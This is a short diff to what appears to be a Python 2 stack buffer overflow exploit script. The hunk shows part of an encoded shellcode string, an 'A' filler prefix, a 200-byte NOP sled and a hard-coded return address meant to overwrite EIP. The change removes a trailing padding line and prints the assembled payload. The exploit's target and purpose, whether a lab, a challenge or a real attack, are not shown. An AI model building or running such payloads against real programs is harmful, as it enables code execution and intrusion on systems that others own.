@@ -21,6 +21,4 @@ buf += "\x55\x51\x70\x58\x68\x4d\x4f\x70\x41\x41"
 prefix = 'A' * (1028 - 200 - len(buf))
 nopsled = '\x90' * 200
 eip = '\x8e\xb3\xff\xff'
-padding = 'X' * (1100 - 1028 - 4)
-
-print prefix + nopsled + buf + eip + padding
+print prefix + nopsled + buf + eip
